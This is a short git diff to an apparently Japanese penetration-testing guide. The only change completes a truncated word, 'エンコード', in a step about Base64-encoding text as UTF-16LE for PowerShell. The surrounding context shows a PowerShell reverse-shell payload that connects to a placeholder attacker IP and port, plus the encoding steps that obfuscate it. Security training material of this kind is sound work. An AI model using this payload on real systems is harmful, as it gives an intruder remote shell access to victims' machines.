@@ -193,7 +193,7 @@ $Text = '$client = New-Object System.Net.Sockets.TCPClient("<attacker_IP>",<PORT
 $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
 $EncodedText =[Convert]::ToBase64String($Bytes)
 ```
-- [Base64 Encoder](https://www.base64encode.org/)を使う場合は、UTF-16LE(PowerShell対応の文字コード)を用いて、`$Text = ''`以外をエンコー
+- [Base64 Encoder](https://www.base64encode.org/)を使う場合は、UTF-16LE(PowerShell対応の文字コード)を用いて、`$Text = ''`以外をエンコード
 
 4. エンコード結果を表示し、メモした後、PowerShellからexitする
 ```powershell
